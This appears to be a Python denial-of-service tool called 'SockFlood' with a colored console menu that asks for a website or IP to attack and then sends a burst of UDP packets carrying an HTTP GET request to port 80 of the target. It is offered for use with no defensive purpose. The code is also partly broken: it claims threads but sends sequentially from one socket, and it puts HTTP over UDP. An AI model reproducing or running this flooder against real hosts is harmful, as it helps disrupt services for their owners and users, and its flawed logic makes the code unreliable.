import os
import socket
import random
import string
import threading
from colorama import Fore, Style

class SockFlood:
    def __init__(self):
        os.system("cls")
        os.system("title MR - An Advance ----- Tool ")
        self.host = None
        self.portnum = None
        self.threads = None
        self.lobby()

    def lobby(self):
        while True:
            print(Fore.CYAN+"""
            ==================================================
            |        [+] Welcome to the sockFlood V1.0        |
            |         [+] Use at your own discretion          |
            |                   [+] Lobby                    |
            ==================================================
            """)
            print(Fore.YELLOW+"""
            [+] attack - Enter the website or IP address to attack [!Required]
            """)
            print(Fore.GREEN+"""
            [+] amount - Enter a custom amount of attack, Default 1000 to infinite
            """)
            print(Fore.MAGENTA+"""
            [+] start - Will start attacking and display outputs on console
            """)

            cmd = input(Style.RESET_ALL+" MR-infinity "+Fore.RED+">> "+Style.RESET_ALL)

            if cmd == "attack":
                self.host = input(Fore.GREEN+" Enter the website or IP address to attack: ")
                try:
                    socket.gethostbyname(self.host)
                except socket.error:
                    print(Fore.RED+f"[-] ERROR: Could not resolve {self.host}")
                    continue

            elif cmd == "amount":
                self.threads = input(Fore.YELLOW+" Enter the number of threads [default = 1000]: ")
            elif cmd == "start":
                self.start_attack(self.host, self.portnum, self.threads)
            else:
                print(Fore.RED+"[-] Invalid command")
                continue

    def start_attack(self, host, port=None, threads=1000):
        if not port:
            port = 80
        else:
            port = int(port)
        if not threads:
            threads = 1000
        else:
            threads = int(threads)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            url_path = str(string.ascii_letters + string.digits + string.punctuation)
            byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
            for i in range(threads):
                self.sock.sendto(byt, (host, port))
            print(Fore.WHITE+f"[+] Started flooding {host} with {threads} threads!")
        except Exception as e:
            print(Fore.RED+f"[-] ERROR : {e}")

SockFlood()
